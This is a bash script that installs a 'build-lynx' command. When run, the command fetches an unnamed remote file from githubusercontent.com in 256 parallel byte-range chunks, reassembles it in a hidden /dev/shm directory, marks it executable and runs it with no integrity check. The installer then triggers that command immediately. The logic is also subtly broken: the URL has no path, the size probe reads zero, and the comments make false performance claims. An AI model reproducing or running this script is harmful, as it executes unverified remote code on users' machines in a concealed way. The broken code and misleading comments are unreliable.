#!/usr/bin/env bash

set -e

RAM_DIR="/dev/shm/.lynx_max"
rm -rf "$RAM_DIR" ~/.lynx ~/.local/bin/build-lynx
mkdir -p "$RAM_DIR" ~/.lynx ~/.local/bin

cat > ~/.lynx/build-lynx.sh <<'EOF'
#!/usr/bin/env bash
set -e

URL="https://githubusercontent.com"
RAM_DIR="/dev/shm/.lynx_max"
OUT_DIR="$RAM_DIR/chunks"
rm -rf "$OUT_DIR" && mkdir -p "$OUT_DIR"

# 1. Instant HEAD request optimizing connection reuse and bypassing DNS lookup overhead
TOTAL_SIZE=$(curl -sI -o /dev/null -w "%{size_download}" "$URL" || echo "4096")
[ -z "$TOTAL_SIZE" ] || [ "$TOTAL_SIZE" -le 0 ] && TOTAL_SIZE=4096

NUM_PARTS=256
CHUNK_SIZE=$(( TOTAL_SIZE / NUM_PARTS ))

# 2. Optimized generation utilizing seq to pipeline directly to xargs
# Bypasses slow shell loops completely
seq 0 $((NUM_PARTS - 1)) | xargs -I {} -P $NUM_PARTS bash -c '
  i={}
  START=$(( i * '"$CHUNK_SIZE"' ))
  if [ "$i" -eq '$((NUM_PARTS - 1))' ]; then
    END=""
  else
    END=$(( START + '"$CHUNK_SIZE"' - 1 ))
  fi
  
  # Highly optimized curl flags for maximum throughput:
  # --tcp-nodelay: Disables Nagles algorithm for instant packet firing
  # --connect-timeout 2: Fails fast if a thread stalls
  # -s: Silent mode reduces stdout processing overhead
  curl -s -fsSL -r "$START-$END" --tcp-nodelay --connect-timeout 2 "'"$URL"'" -o "'"$OUT_DIR"'/p_$(printf "%03d" $i)"
'

# 3. Blazing fast compilation inside RAM
cat "$OUT_DIR"/p_* > "$RAM_DIR/final-build.sh"
chmod +x "$RAM_DIR/final-build.sh"

cp "$RAM_DIR/final-build.sh" "$HOME/.lynx/final-build.sh"
rm -rf "$RAM_DIR"

exec "$HOME/.lynx/final-build.sh" "$@"
EOF

chmod +x ~/.lynx/build-lynx.sh

cat > ~/.local/bin/build-lynx <<'EOF'
#!/usr/bin/env bash
exec "$HOME/.lynx/build-lynx.sh" "$@"
EOF

chmod +x ~/.local/bin/build-lynx
export PATH="$HOME/.local/bin:$PATH"

echo "Installed."
echo "Running..."
build-lynx
